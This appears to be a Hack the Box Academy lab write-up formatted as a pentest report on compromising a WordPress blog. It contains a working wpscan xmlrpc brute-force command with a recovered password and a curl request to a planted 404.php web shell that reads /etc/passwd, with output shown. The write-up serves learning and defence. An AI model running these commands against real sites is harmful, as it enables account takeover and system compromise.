---
title: Hack the Box
subtitle: "Attacking WordPress"
author:
  - errbufferoverfl
date: 2023-10-21T19:23:04+11:00
categories:
  - Learning
  - Hack the Box
  - Hack the Box Academy
  - Offensive
  - Wordpress
---

## Summary

During the course of the assessment **Sec Sad World** exploit a number of security weaknesses in the Inlane Freight WordPress blog resulting in full administrative compromise and remote code execution. Below, we detail the steps taken from host enumeration to compromise. 

The intent of the attack chain is to demonstrate to Inlane Freight how individual weaknesses fit together to create vulnerabilities, demonstrating the overall risk to the client environment, informing the vulnerability triage process and remediation efforts.

While other findings shown in this report could be leveraged to gain a similar level of access, this attack chain shows the initial path of least resistance taken during testing to achieve the outcome.

## Attack Chain: Compromising WordPress

**Sec Sad World** performed the following to full compromise the the `blog.inlanefreight.local` website.

1. **Sec Sad World** used nmap to enumerate the hosts in scope ([Appendix A. Scope](#Appendix%20A.%20Scope)) and identify targets of interest. Fingerprinting of blog.inlanefreight.local identified it as a host of interest as it was running WordPress 5.8.
2. `wpscan` was used on blog.inlanefreight.local to identify the admin and doug user accounts that could be quickly brute-forced using `xmlrpc`.
3. Using `wpscan` and the `rockyou` password list, Sec Sad World brute-forced and obtained the password for the doug user account. Using this password, Sec Sad World logged in to the WordPress administrative interface.
4. Once authenticated, Sec Sad World located a disabled theme and made modifications to the `404.php` page, adding in functionality that would allow Sec Sad World to execute remote code on the operating system.
5. Once updated, Sec Sad World was able to operating system command injection using `cURL` exposing sensitive information such as the contents of `/etc/passwd` and the contents of the `flag.txt` file located in the web root.

- Exposure of Sensitive Information to an Unauthorized Actor
- Improper Restriction of Excessive Authentication Attempts
- Weak Password Requirements
- Insufficient Logging
- Gain administrative privileges
- Inclusion of Functionality from Untrusted Control Sphere
- Execution with Unnecessary Privileges
- Results in remote code execution
- Exposure of Sensitive Information to an Unauthorised Actor

Alternative paths:
- Use of Unmaintained Third Party Components

## Findings

### Weak Password Requirements

*The affected host does not require users to have strong passwords, making it easier for threat actors to compromise user accounts.*

- **CWE:** CWE-521
- **CVSS 3.1 Score:** 9.1 Critical
- **CVSS 3.1 Temporal Score:** 8.7 High
- **Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C
- **Security Impact:** When successfully exploited, weak password requirements can result in a threat actor gaining long-term unauthorised access to the users account. Depending on the permissions associated with the compromised account, impact can vary.
- **Affected Hosts:** blog.inlanefreight.local

#### Reproduction

The following figure shows using WPScan and the `rockyou.txt` password list against `blog.inlanefreight.local` to brute-force the password for the user account `doug`. 

`xmlrpc` is used as it is faster than HTTP-based password brute-forcing.

```
wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -t 20 -U doug -P ~/Sauce/SecLists/Passwords/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.inlanefreight.local/ [10.129.107.187]
[+] Started: Fri Oct 27 08:51:01 2023

...

[!] Valid Combinations Found:
 | Username: doug, Password: jessica1

...

[+] Finished: Fri Oct 27 08:51:40 2023
[+] Requests Done: 799
[+] Cached Requests: 41
[+] Data Sent: 393.439 KB
[+] Data Received: 448.799 KB
[+] Memory used: 284.395 MB
[+] Elapsed time: 00:00:38
```

#### Remediation



### Exposure of Sensitive System Information to an Unauthorized Control Sphere

*The affected host does not properly prevent sensitive system-level information from being accessed by unauthorised actors who do not have the same level of access to the underlying system as the product does.* 

- **CWE:** CWE-497
- **CVSS 3.1 Score:** 8.6 High
- **Temporal Score:** 8.0 High
- **Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:F/RL:O/RC:C
- **Security Impact:** When successfully exploited the affected component reveals system data to unauthorised parties. Depending on the information returned, impact can vary.
- **Affected Hosts:** blog.inlanefreight.local

#### Reproduction

```{.shell-console}
curl -s http://blog.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=cat%20/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
webadmin:x:1001:1001::/home/webadmin:/bin/bash
mrb3n:x:1002:1002::/home/mrb3n:/bin/sh
```

#### Remediation

This class of weakness is typically introduced during the design and implementation phase of the software development life-cycle. To mitigate the impact of this weakness, and reduce the likelihood of re-occurrence:

- Migrate the management of production-based WordPress instances to a centrally managed Continuous Integration / Continuous Deployment (CI/CD) pipeline.
- Disable or limit access to the WordPress web interface that allows plugin and theme modification.
- Enforce quality assurance & security checks on the CI/CD pipeline, for example Static Application Security Testing (SAST), can find some instances of this weakness by analysing source code and prevent deployment.
- Ensure any theme or plugin developers are provided ongoing training and education on common PHP security vulnerabilities, how to identify and prevent them.
- Implement security auditing & monitoring on sensitive actions such as theme and plugin modification to ensure the timely identification of unauthorised actions.

## Appendix A. Exploited Systems

- blog.inlanefreight.local

## Appendix B. Compromised Users

The following is a list of user accounts compromised in the course of the assessment.

| Username | Type | Method | Notes |
|----------|------|--------| ----- |
| doug | Wordpress Administrator | Password Brute Forcing | |

## Appendix C. Changes Made to the System & Artefacts Cleanup

